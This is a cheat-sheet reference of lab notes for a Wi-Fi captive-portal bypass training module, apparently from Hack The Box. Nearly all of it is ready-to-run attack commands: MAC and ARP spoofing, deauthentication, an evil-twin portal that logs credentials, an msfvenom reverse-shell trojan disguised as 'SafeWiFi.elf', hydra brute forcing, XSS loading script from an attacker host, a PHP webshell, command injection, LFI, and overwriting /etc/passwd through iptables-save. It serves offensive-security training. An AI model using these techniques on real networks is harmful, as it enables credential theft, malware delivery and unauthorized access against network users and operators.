# Bypassing Wi-Fi Captive Portals

> **Purpose:** Structured reference for the _Bypassing Wi-Fi Captive Portals_ module: recon, MAC spoofing, VPN tricks, ARP hijacking, hostile portals, brute forcing and web-layer attacks.  
> **Audience:** Students / red-teamers practicing in **authorized lab environments only**.  
> **Warning:** Do **not** use these techniques on networks you don’t own or have explicit permission to test.

---

## 1. Reconnaissance & Public Networks

### 1.1 Scan a specific BSSID on a channel

```bash
# Capture traffic for a specific BSSID on channel 1
sudo airodump-ng -c 1 --bssid A6:89:F8:B8:78:DA wlan0mon
```

**Breakdown:**

- `sudo` – run with root privileges.
    
- `airodump-ng` – 802.11 capture / recon tool.
    
- `-c 1` – lock capture to **channel 1**.
    
- `--bssid A6:89:F8:B8:78:DA` – only show traffic from this AP.
    
- `wlan0mon` – wireless interface in **monitor** mode.
    

---

### 1.2 Identify the gateway and basic network path

```bash
# Show the routing table and identify the default gateway
route -n
```

**Breakdown:**

- `route` – view kernel networking routes.
    
- `-n` – show numeric addresses (no DNS lookup).
    

```bash
# Trace route using ICMP (check if ICMP is allowed)
traceroute 8.8.8.8
```

**Breakdown:**

- `traceroute` – displays hop-by-hop path to a destination.
    
- `8.8.8.8` – Google DNS; used here as a generic Internet target.
    

```bash
# Trace route using TCP port 80 (check if traffic is restricted to HTTP)
traceroute -p 80 8.8.8.8
```

**Breakdown:**

- `-p 80` – use port 80 for probes (mimic HTTP).
    
- `8.8.8.8` – same target, but useful when ICMP is blocked.
    

---

### 1.3 Fingerprint captive portal services

```bash
# Scan all TCP ports on the gateway, detect service versions
sudo nmap -p- -sV 192.168.0.1
```

**Breakdown:**

- `nmap` – port scanner.
    
- `-p-` – scan all 65,535 TCP ports.
    
- `-sV` – probe and detect service versions.
    
- `192.168.0.1` – typical gateway / captive portal IP.
    

---

## 2. MAC Address Spoofing & Static Configuration

### 2.1 Discover active hosts & their MAC addresses

```bash
# Discover live hosts and print their IP => MAC mapping
sudo nmap -v -n -sn 192.168.0.1/24 | awk '/is up/{print up}; {gsub (/\(|\)/,""); up = $NF}/MAC Address:/{print " => "$3;}'
```

**Breakdown:**

- `sudo` – required for raw-packet scan.
    
- `nmap -v -n -sn 192.168.0.1/24`
    
    - `-v` – verbose.
        
    - `-n` – no DNS resolution.
        
    - `-sn` – ping / host discovery only, no port scan.
        
    - `192.168.0.1/24` – scan entire /24 around the gateway.
        
- Piped `awk` – parses Nmap output to print _IP ⇒ MAC_ pairs.
    

---

### 2.2 Spoof your wireless MAC

```bash
# Change wlan0 MAC address to a chosen value
sudo ifconfig wlan0 down
sudo macchanger -m 5c:1a:cf:b5:8f:cc wlan0
sudo ifconfig wlan0 up
```

**Breakdown:**

- `ifconfig wlan0 down` – disable interface before changing MAC.
    
- `macchanger -m 5c:1a:cf:b5:8f:cc wlan0`
    
    - `-m` – set an explicit MAC address.
        
- `ifconfig wlan0 up` – re-enable interface with spoofed MAC.
    

---

### 2.3 Assign a static IP & default gateway

```bash
# Set a static IP and default gateway (mimic another client)
sudo ifconfig wlan0 192.168.0.60 netmask 255.255.255.0
sudo route add default via 192.168.0.1
```

**Breakdown:**

- `ifconfig wlan0 192.168.0.60 netmask 255.255.255.0` – assign IP + netmask.
    
- `route add default via 192.168.0.1` – set default route through portal/gateway.
    

---

### 2.4 Install tools & clone **hack-captive-portals**

```bash
# Install dependencies and clone the hack-captive-portals toolkit
sudo apt -y install sipcalc nmap
git clone https://github.com/systematicat/hack-captive-portals.git
cd hack-captive-portals
sudo chmod u+x hack-captive.sh
```

**Breakdown:**

- `apt -y install sipcalc nmap` – install subnet calculator + Nmap.
    
- `git clone ...` – pull the toolkit repo.
    
- `cd hack-captive-portals` – enter directory.
    
- `chmod u+x` – make the script executable.
    

```bash
# Run the captive portal bypass helper script
sudo bash hack-captive.sh
```

**Breakdown:**

- `bash hack-captive.sh` – executes scripted checks / bypass attempts.
    

---

## 3. VPN-Based Bypasses

### 3.1 Check DNS forwarding

```bash
# Check if external DNS queries are forwarded correctly
dig hackthebox.com +short
dig academy.hackthebox.com +short
```

**Breakdown:**

- `dig` – DNS lookup utility.
    
- `+short` – compact answer only (IP addresses).
    

---

### 3.2 Check if DNS (UDP 53) is reachable

```bash
# Scan UDP port 53 on the gateway to see if DNS is allowed
nmap -sU -sV -p 53 192.168.0.1
```

**Breakdown:**

- `-sU` – UDP scan.
    
- `-sV` – version detection.
    
- `-p 53` – DNS port.
    

---

### 3.3 Start an OpenVPN tunnel

```bash
# Establish VPN tunnel with the provided OpenVPN config
sudo openvpn htb.ovpn
```

**Breakdown:**

- `openvpn htb.ovpn` – start OpenVPN using given `.ovpn` profile.
    

---

## 4. ARP Spoofing & Client Hijacking

### 4.1 Basic host discovery & ARP view

```bash
# Show local interface IP/MAC
ifconfig wlan0

# Discover all live hosts in the 200.200.200.0/24 subnet
sudo nmap -v -n -sn 200.200.200.0/24 | awk '/is up/{print up}; {gsub (/\(|\)/,""); up = $NF}'

# View ARP table entries
arp -a
```

**Breakdown (high-level):**

- `ifconfig` – show interface configuration.
    
- `nmap -sn` – host discovery only, verbose & no DNS.
    
- `arp -a` – list IP⇔MAC mappings learned via ARP.
    

---

### 4.2 Bidirectional ARP spoofing

```bash
# Poison ARP cache in both directions (client <-> gateway)
arpspoof -i wlan0 -t <clientIP> <gatewayIP>
arpspoof -i wlan0 -t <gatewayIP> <clientIP>
```

**Breakdown:**

- `arpspoof` – send forged ARP replies.
    
- `-i wlan0` – interface to use.
    
- `-t <clientIP>` – target victim IP.
    
- `<gatewayIP>` / `<clientIP>` – IP to impersonate for each target.
    

---

## 5. External HTTP Credential Interception

_(From outside the victim network, capturing HTTP traffic heading to the portal.)_

### 5.1 Prepare wireless capture

```bash
# Check wireless interfaces (original text says 'iwfconfig', it's effectively iwconfig)
iwconfig

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Capture traffic for target captive portal BSSID on channel 1
sudo airodump-ng -c 1 --bssid 6A:48:AC:B4:EF:06 wlan0mon -w credcap
```

**Breakdown:**

- `iwconfig` – show Wi-Fi interfaces and modes.
    
- `airmon-ng start wlan0` – create monitor interface `wlan0mon`.
    
- `airodump-ng ... -w credcap` – capture traffic to `credcap-01.cap`.
    

---

### 5.2 Inspect capture in Wireshark & filter HTTP

```bash
# Open capture in Wireshark (GUI)
sudo -E wireshark credcap-01.cap
```

**Breakdown:**

- `-E` – preserve environment (e.g., display settings) when using `sudo`.
    

```bash
# Wireshark display filter: show only HTTP GET/POST
(http.request.method == "POST") or (http.request.method == "GET")

# Only HTTP requests destined to 192.168.0.1 (portal)
(http.request.method == "POST" && ip.dst == 192.168.0.1) or (http.request.method == "GET" && ip.dst == 192.168.0.1)
```

**Breakdown:**

- `http.request.method` – restrict by HTTP method.
    
- `ip.dst == 192.168.0.1` – show requests to the captive portal IP.
    

---

### 5.3 Analyze portal & crack captured hashes

```bash
# Retrieve and inspect the captive portal page
curl -v http://captive.htb.local
```

**Breakdown:**

- `curl -v` – verbose HTTP client (headers + body).
    

```bash
# Crack an unsalted SHA1 hash (e.g., from captured creds)
hashcat -m 100 -a 0 12A00057AE853A05601D5FAFB7BC8141C37EAABE /path/to/wordlist

# Crack a salted SHA1 hash (salt appended after colon)
hashcat -m 110 -a 0 4B866B26E76F822DED3C1ECE4B1772F25531286B:HTB-Salt /path/to/wordlist
```

**Breakdown:**

- `hashcat` – GPU/CPU password cracker.
    
- `-m 100` – SHA1 (unsalted).
    
- `-m 110` – SHA1 (salted).
    
- `-a 0` – straight dictionary attack.
    
- `...:HTB-Salt` – hash + salt in one token.
    

```bash
# Send a POST request with a known hashed password to the portal
curl -X POST -d 'username=admin&password=391aa8b7234d908027efe09114f5453a&submit=Sign+In' 192.168.0.1
```

**Breakdown:**

- `-X POST` – HTTP POST.
    
- `-d 'username=...&password=...` – form data; password already hashed.
    
- `192.168.0.1` – portal IP.
    

---

## 6. External HTTP Session Interception

### 6.1 Capture HTTP sessions

```bash
# Capture HTTP sessions from the target BSSID
sudo airodump-ng -c 1 --bssid 6A:48:AC:B4:EF:06 wlan0mon -w sessioncap
```

```bash
# Open the session capture in Wireshark
sudo -E wireshark sessioncap-01.cap
```

```bash
# Wireshark filter: HTTP requests to the captive portal IP
(http.request.method == "POST" && ip.dst == 192.168.0.1) or (http.request.method == "GET" && ip.dst == 192.168.0.1)
```

**Breakdown:**

- Same pattern as Section 5; different capture filename (`sessioncap`).
    

---

## 7. Hostile Portal / Evil-Twin Setup

### 7.1 Build a cloned captive portal

```bash
# Install Apache + PHP
sudo apt-get install apache2 php libapache2-mod-php

# Enable URL rewriting
sudo a2enmod rewrite

# Restart Apache
sudo service apache2 restart

# Clone the real captive portal site
httrack http://captive.htb.local

# Create a file to store captured passwords
sudo sh -c 'echo "" >> /var/www/html/passes.lst'
```

**Breakdown:**

- `apache2`, `php`, `libapache2-mod-php` – LAMP-style stack for the fake portal.
    
- `a2enmod rewrite` – enable `.htaccess`/rewrite rules.
    
- `httrack` – offline site copier used to clone the portal.
    
- `passes.lst` – flat file to log credentials.
    

---

### 7.2 DNS/DHCP + routing for Evil Twin

```bash
# Deploy cloned portal files and fix permissions
sudo cp * /var/www/html
sudo chown -R www-data:www-data /var/www/html/*

# Restart dnsmasq with custom config
sudo service dnsmasq stop
sudo dnsmasq -C dns.conf -d

# Configure rogue AP interface and routing
sudo ifconfig wlan1 192.168.0.1/24
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo hostapd hostapd.conf

# Force clients off real AP toward the evil twin
aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon
```

**Breakdown (high-level):**

- `dnsmasq -C dns.conf -d` – DHCP/DNS for captive network.
    
- `wlan1 192.168.0.1/24` – EVIL AP gateway IP.
    
- `echo 1 > ...ip_forward` – enable IP forwarding.
    
- `hostapd` – host the rogue AP matching the target SSID.
    
- `aireplay-ng --deauth` – deauth real clients to steer them to Evil Twin.
    

---

## 8. Client Hijacking via Vulnerable Service (FTP Example)

### 8.1 Find and profile vulnerable services

```bash
# Scan network for active clients
sudo nmap -v -n -sn 192.168.0.1/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}'

# Scan several hosts at once
nmap 192.168.0.60,61,59

# Probe a non-standard FTP service on port 2121
nmap -T4 -sC -sV 192.168.0.60 -Pn -p2121
```

**Breakdown:**

- `-T4` – faster timing.
    
- `-sC` – default scripts.
    
- `-sV` – version detection.
    
- `-Pn` – skip host discovery (treat as up).
    

---

### 8.2 Abuse FTP to pull sensitive files

```bash
# Connect to the FTP service
nc 192.168.0.60 2121

# Listen on port 1258 to act as data channel
nc -nvlp 1258

# Tell FTP server to use our chosen data port (1*256 + 1002 = 1258)
PORT 192,168,0,56,1,1002

# Retrieve /etc/passwd via FTP
RETR ../../../etc/passwd
```

**Breakdown (high-level):**

- `nc` – netcat for raw TCP connections.
    
- `PORT` – specify client-side IP/port for active FTP.
    
- `RETR` – request file download.
    

```bash
# On the compromised client, view stored Wi-Fi connection details
cat /etc/NetworkManager/system-connections/HTBCorp.nmconnection
```

**Breakdown:**

- `NetworkManager/...nmconnection` – contains SSID, security settings, sometimes credentials.
    

---

## 9. Client Hijacking through Interception

### 9.1 Capture victim HTTP requests

```bash
# Capture traffic for the target BSSID
sudo airodump-ng -c 1 --bssid 6A:48:AC:B4:EF:06 wlan0mon -w credcap

# Open capture and filter HTTP requests for specific hosts
sudo -E wireshark credcap-01.cap

# Filter HTTP requests to two internal hosts
(http.request.method == "POST" && ip.dst == 192.168.0.1) or (http.request.method == "GET" && ip.dst == 192.168.0.1)
(http.request.method == "POST" && ip.dst == 192.168.0.16) or (http.request.method == "GET" && ip.dst == 192.168.0.16)
```

**Breakdown:**

- Two display filters to focus on different internal web servers.
    

---

### 9.2 Take over client connection (post-portal)

```bash
# Connect to Wi-Fi with wpa_supplicant
sudo wpa_supplicant -c wpa_supplicant.conf -i wlan0

# Release & renew DHCP lease
sudo dhclient wlan0 -r
sudo dhclient wlan0

# Verify assigned IP
ifconfig wlan0
```

**Breakdown:**

- `wpa_supplicant.conf` – contains network SSID and credentials.
    
- `dhclient` – obtain / release IP from DHCP server.
    

---

## 10. Client Hijacking via Malware Portal

_(Re-use hostile portal / Evil Twin setup, but deliver malware.)_

```bash
# Web server and evil-twin infrastructure (same as Section 7)
sudo apt-get install apache2 php libapache2-mod-php
sudo a2enmod rewrite
sudo service apache2 restart
sudo cp * /var/www/html
sudo chown -R www-data:www-data /var/www/html/*
sudo service dnsmasq stop
sudo dnsmasq -C dns.conf -d
sudo ifconfig wlan1 192.168.0.1/24
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo hostapd hostapd.conf

# Generate Linux reverse shell payload and listen for connections
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > SafeWiFi.elf
nc -lvnp 4444

# Deauth legit AP to push clients to malware portal
aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon
```

**Breakdown (high-level):**

- `msfvenom` – creates an ELF reverse shell trojan.
    
- `nc -lvnp 4444` – listen for reverse shell.
    

---

## 11. Brute Forcing Captive Portal Credentials

### 11.1 Monitor live traffic & isolate login attempts

```bash
# Sniff Wi-Fi traffic live
sudo -E wireshark -i wlan0
```

```bash
# Wireshark filter: HTTP POSTs from specific src → dst
(http.request.method == POST) && (ip.dst == 214.214.214.6) && (ip.src == 214.214.214.4)
```

**Breakdown:**

- Filter narrows down login POSTs between two specific IPs.
    

---

### 11.2 Generate numeric username wordlist & brute force

```bash
# Generate numbers 1-1000 (example username list)
seq 1 1000 > numbers.txt
```

```bash
# Brute-force valid usernames (empty password)
hydra -vv -L numbers.txt -p '' captive.htb.local http-post-form "/received.php:username=^USER^&submit=Sign+In:Incorrect username."
```

**Breakdown:**

- `seq 1 1000` – generates candidate usernames `1..1000`.
    
- `hydra -vv` – very verbose.
    
- `-L numbers.txt` – username list.
    
- `-p ''` – blank password.
    
- `http-post-form "path:params:error_string"` – Hydra’s web form syntax.
    

---

### 11.3 Brute force username + password combos

```bash
# Brute-force username and password fields
hydra -vv -L /opt/names.txt -p '' captive.htb.local http-post-form "/received.php:username=^USER^&password=^PASS^&submit=Sign+In:Incorrect username."
```

```bash
# Once valid username is known, brute-force its password
hydra -vv -l admin -P /opt/rockyou.txt captive.htb.local http-post-form "/received.php:username=^USER^&password=^PASS^&submit=Sign+In:Incorrect password."
```

**Breakdown:**

- `-L /opt/names.txt` – username wordlist.
    
- `-l admin` – single known username.
    
- `-P /opt/rockyou.txt` – password wordlist.
    
- Error strings `Incorrect username/password.` tell Hydra when a guess fails.
    

---

## 12. Portal Hijacking via XSS & Command Injection

### 12.1 Testing for XSS

```html
<!-- Simple reflected XSS test -->
<script>alert("XSS Capable")</script>
```

```html
<!-- Test for script execution / user interaction -->
"><script src=http://200.200.200.78:9200/TESTING_THIS</script>
```

**Breakdown:**

- Injected payloads are placed into vulnerable input fields / parameters to check for reflected XSS.
    

---

### 12.2 Hosting payloads & catching callbacks

```bash
# Listen for HTTP callbacks from XSS payloads
nc -lvnp 9200

# Serve JS payloads with a simple PHP dev server
sudo php -S 0.0.0.0:9200
```

```html
<!-- Trigger external script.js from attacker host -->
"><script src=http://200.200.200.78:9200/script.js></script>
```

**Breakdown:**

- `nc` + `php -S` provide a simple HTTP service for XSS beacons / scripts.
    

---

### 12.3 Webshell & command injection

```php
<?php system($_GET['cmd']); ?>
```

```bash
# Example command injection payload
200.200.200.78; whoami

# Simple Python HTTP server for file delivery
python3 -m http.server 5555
```

**Breakdown:**

- PHP snippet – ultra-minimal webshell executing `cmd` parameter.
    
- `...; whoami` – appends extra shell command when injection exists.
    
- `python3 -m http.server 5555` – serves payloads over HTTP.
    

---

## 13. Host Header Manipulation & File Upload Attacks

### 13.1 Directory fuzzing

```bash
# Discover hidden paths on captive portal
dirb http://captive.htb.local
```

**Breakdown:**

- `dirb` – brute-forces web directories using wordlists.
    

---

### 13.2 Host header manipulation

```bash
# Access internal admin endpoint by spoofing Host header
curl -H "Host: 127.0.0.1" http://captive.htb.local/admin
curl -H "Host: localhost" http://captive.htb.local/admin

# Abuse X-Forwarded-* style headers and URL smuggling
curl -H "X-Forwarded-For: 127.0.0.1"    http://captive.htb.local/server-status
curl -H "X-Forwarded-Host: 127.0.0.1"   http://captive.htb.local/server-status
curl -H "X-Original-URL: /server-status" http://captive.htb.local/server-status
```

**Breakdown:**

- Spoofs origin so backend treats request as coming from localhost.
    

---

## 14. File Inclusion & Gaining an Exception (iptables Trick)

### 14.1 Path traversal / file inclusion

```txt
# Access /etc/passwd via LFI
http://192.168.0.6/login.php?file=/../../../../../etc/passwd

# Read Apache access log via LFI
http://192.168.0.6/login.php?file=../../../var/log/apache2/access.log
```

**Breakdown:**

- `file=...` parameter – vulnerable include used for directory traversal.
    

---

### 14.2 Abuse iptables rules + comments

```bash
# Allow all forwarded packets from our IP
sudo iptables -A FORWARD -s <our-ip> -j ACCEPT

# Allow specific client IP through the server (wlan0 -> eth0)
sudo iptables -A FORWARD -i wlan0 -o eth0 -s 192.168.0.19 -j ACCEPT

# Generate password hash (e.g. 'toor')
openssl passwd toor

# Embed payload into iptables rule comment
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[PAYLOAD]\n'

# Save iptables rules into /etc/passwd (abusing file write)
sudo iptables-save -f /etc/passwd
```

**Breakdown:**

- `iptables -A FORWARD` – add forwarding rules for specific hosts.
    
- `-m comment --comment` – store arbitrary text inside ruleset.
    
- `iptables-save -f` – write current rules to a file (here misused as `/etc/passwd`).
    

---

This markdown mirrors the original **Bypassing Wi-Fi Captive Portals** PDF content in a cheatsheet-style format consistent with the other Wi-Fi module notes.